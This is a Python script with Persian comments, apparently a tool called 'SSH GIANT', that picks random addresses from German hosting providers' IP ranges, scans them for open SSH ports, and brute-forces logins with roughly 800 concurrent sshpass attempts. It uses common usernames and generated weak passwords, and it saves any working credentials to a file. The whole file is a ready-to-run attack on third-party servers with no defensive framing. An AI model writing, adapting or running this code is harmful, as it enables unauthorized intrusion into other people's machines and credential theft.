#!/usr/bin/env python3
import asyncio
import random
import ipaddress
import socket
import os
import sys
from datetime import datetime

# =================== تنظیمات انفجاری ===================
SSH_TIMEOUT = 1.0          # تایم‌اوت اتصال (ثانیه) - خیلی کم
CONNECTION_LIMIT = 800     # حداکثر کانکشن همزمان کل
NUM_RUNNERS = 10           # ۱۰ رانر موازی
TASKS_PER_RUNNER = 80      # هر رانر ۸۰ کارگر → جمعاً ۸۰۰ کارگر
MAX_IPS = 2000             # حداکثر آی‌پی برای تولید
MAX_PASSWORDS = 1000       # حداکثر رمز برای تولید

# رنج‌های آلمان (Hetzner, Contabo, ...)
GERMAN_RANGES = [
    "136.243.0.0/16", "5.9.0.0/16", "78.46.0.0/15", "85.10.192.0/18",
    "88.198.0.0/16", "95.216.0.0/15", "116.203.0.0/16", "138.201.0.0/16",
    "144.76.0.0/16", "148.251.0.0/16", "157.90.0.0/16", "159.69.0.0/16",
    "168.119.0.0/16", "176.9.0.0/16", "188.40.0.0/16", "193.47.80.0/20",
    "213.133.96.0/19"
]

COMMON_USERNAMES = [
    "root", "admin", "user", "ubuntu", "debian", "centos", "test",
    "oracle", "postgres", "mysql", "www-data", "backup", "pi", "azureuser"
]

BASE_PASSWORDS = [
    "123456", "password", "123456789", "qwerty", "abc123", "admin", "root",
    "toor", "Passw0rd", "P@ssw0rd", "welcome", "login"
]

# =================== توابع رانرها ===================
def generate_ips_from_ranges(ranges, max_ips=MAX_IPS):
    """تولید آی‌پی تصادفی از رنج‌ها"""
    all_ips = set()
    for r in ranges:
        try:
            net = ipaddress.ip_network(r)
            hosts = list(net.hosts())
            if not hosts:
                continue
            sample = min(100, len(hosts))
            for ip in random.sample(hosts, sample):
                all_ips.add(str(ip))
                if len(all_ips) >= max_ips:
                    return list(all_ips)
        except:
            continue
    return list(all_ips)

async def check_port_22(ip, timeout=0.5):
    """TCP connect به پورت 22 - خیلی سریع"""
    try:
        loop = asyncio.get_running_loop()
        conn = asyncio.open_connection(ip, 22)
        await asyncio.wait_for(conn, timeout=timeout)
        return True
    except:
        return False

async def scan_alive_ips(ip_list, max_concurrent=500):
    """اسکن همزمان پورت 22 با حداکثر ۵۰۰ کانکشن همزمان"""
    sem = asyncio.Semaphore(max_concurrent)
    async def limited_check(ip):
        async with sem:
            return await check_port_22(ip)
    tasks = [limited_check(ip) for ip in ip_list]
    results = await asyncio.gather(*tasks)
    return [ip for ip, alive in zip(ip_list, results) if alive]

def generate_usernames():
    with open("usernames.txt", "w") as f:
        for u in COMMON_USERNAMES:
            f.write(u + "\n")
    print(f"[+] {len(COMMON_USERNAMES)} usernames saved.")

def generate_passwords(count=MAX_PASSWORDS):
    passwords = set(BASE_PASSWORDS)
    while len(passwords) < count:
        base = random.choice(BASE_PASSWORDS)
        suffix = str(random.randint(1, 9999))
        passwords.add(base + suffix)
        passwords.add(base + "_" + suffix)
    passwords = list(passwords)[:count]
    with open("passwords.txt", "w") as f:
        for p in passwords:
            f.write(p + "\n")
    print(f"[+] {len(passwords)} passwords saved.")

async def test_ssh(ip, username, password, semaphore, stop_event):
    if stop_event.is_set():
        return None
    async with semaphore:
        cmd = (
            f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no "
            f"-o ConnectTimeout={SSH_TIMEOUT} -o PubkeyAuthentication=no "
            f"-o PreferredAuthentications=password -o LogLevel=ERROR "
            f"{username}@{ip} exit"
        )
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL
            )
            await asyncio.wait_for(proc.wait(), timeout=SSH_TIMEOUT+1)
            if proc.returncode == 0:
                stop_event.set()
                return (ip, username, password)
        except:
            pass
        return None

async def runner_worker(queue, semaphore, stop_event, runner_id, results_queue):
    """هر رانر یک کارگر است که از صف ترکیب‌ها می‌گیرد و تست می‌کند"""
    while not stop_event.is_set():
        try:
            item = await asyncio.wait_for(queue.get(), timeout=0.5)
        except asyncio.TimeoutError:
            continue
        if item is None:
            queue.task_done()
            break
        ip, user, pwd = item
        result = await test_ssh(ip, user, pwd, semaphore, stop_event)
        if result:
            await results_queue.put(result)
            stop_event.set()
        queue.task_done()

async def runner_manager(runner_id, ip_list, usernames, passwords, global_semaphore, stop_event, results_queue):
    """مدیریت یک رانر: ایجاد صف اختصاصی و کارگرهای درون آن"""
    queue = asyncio.Queue()
    # پر کردن صف با ترکیب‌های مربوط به این رانر (تقسیم کار بین رانرها)
    # برای سادگی، هر رانر همه ترکیب‌ها رو می‌گیره ولی با یک offset
    total_combinations = len(ip_list) * len(usernames) * len(passwords)
    step = NUM_RUNNERS
    start_idx = runner_id
    count = 0
    for i, ip in enumerate(ip_list):
        if (i % step) != start_idx:
            continue
        for user in usernames:
            for pwd in passwords:
                if stop_event.is_set():
                    break
                await queue.put((ip, user, pwd))
                count += 1
            if stop_event.is_set():
                break
        if stop_event.is_set():
            break
    print(f"[Runner {runner_id}] Loaded {count} tasks.")
    # ایجاد کارگرهای درون این رانر
    workers = []
    for _ in range(TASKS_PER_RUNNER):
        w = asyncio.create_task(runner_worker(queue, global_semaphore, stop_event, runner_id, results_queue))
        workers.append(w)
    await queue.join()
    for _ in workers:
        await queue.put(None)
    await asyncio.gather(*workers)

async def main():
    print("="*60)
    print("   🔥 SSH GIANT - 10 Parallel Runners 🔥")
    print(f"   Start: {datetime.now()}")
    print(f"   {NUM_RUNNERS} Runners x {TASKS_PER_RUNNER} Workers = {NUM_RUNNERS*TASKS_PER_RUNNER} Total Concurrent")
    print("="*60)

    # مرحله 1: تولید آی‌پی
    print("\n[1/5] Generating IPs from German ranges...")
    all_ips = generate_ips_from_ranges(GERMAN_RANGES, max_ips=MAX_IPS)
    print(f"      {len(all_ips)} IPs generated.")

    # مرحله 2: اسکن زنده‌ها
    print("\n[2/5] Scanning alive IPs (port 22) with high speed...")
    alive_ips = await scan_alive_ips(all_ips, max_concurrent=500)
    print(f"      {len(alive_ips)} IPs are reachable.")
    if not alive_ips:
        print("[!] No alive IPs. Exiting.")
        return

    # مرحله 3: تولید یوزرنیم
    print("\n[3/5] Generating usernames...")
    generate_usernames()
    with open("usernames.txt") as f:
        usernames = [l.strip() for l in f if l.strip()]

    # مرحله 4: تولید رمز
    print("\n[4/5] Generating passwords...")
    generate_passwords(MAX_PASSWORDS)
    with open("passwords.txt") as f:
        passwords = [l.strip() for l in f if l.strip()]

    # مرحله 5: حمله اصلی با ۱۰ رانر موازی
    print(f"\n[5/5] Launching {NUM_RUNNERS} parallel runners with {TASKS_PER_RUNNER} workers each...")
    global_semaphore = asyncio.Semaphore(CONNECTION_LIMIT)
    stop_event = asyncio.Event()
    results_queue = asyncio.Queue()

    runner_tasks = []
    for i in range(NUM_RUNNERS):
        task = asyncio.create_task(runner_manager(i, alive_ips, usernames, passwords, global_semaphore, stop_event, results_queue))
        runner_tasks.append(task)

    # منتظر اولین نتیجه موفق
    success = None
    try:
        success = await asyncio.wait_for(results_queue.get(), timeout=None)
    except:
        pass
    finally:
        stop_event.set()
        await asyncio.gather(*runner_tasks, return_exceptions=True)

    if success:
        ip, user, pwd = success
        print("\n" + "="*60)
        print("🟢🟢🟢 SUCCESS! 🟢🟢🟢")
        print(f"IP: {ip}")
        print(f"User: {user}")
        print(f"Password: {pwd}")
        print("="*60)
        with open("success.txt", "w") as f:
            f.write(f"IP: {ip}\nUSER: {user}\nPASSWORD: {pwd}\n")
    else:
        print("\n❌ No credentials found after full scan.")

    print(f"\nEnd: {datetime.now()}")

if __name__ == "__main__":
    if os.system("command -v sshpass > /dev/null 2>&1") != 0:
        os.system("sudo apt update && sudo apt install -y sshpass")
    asyncio.run(main())
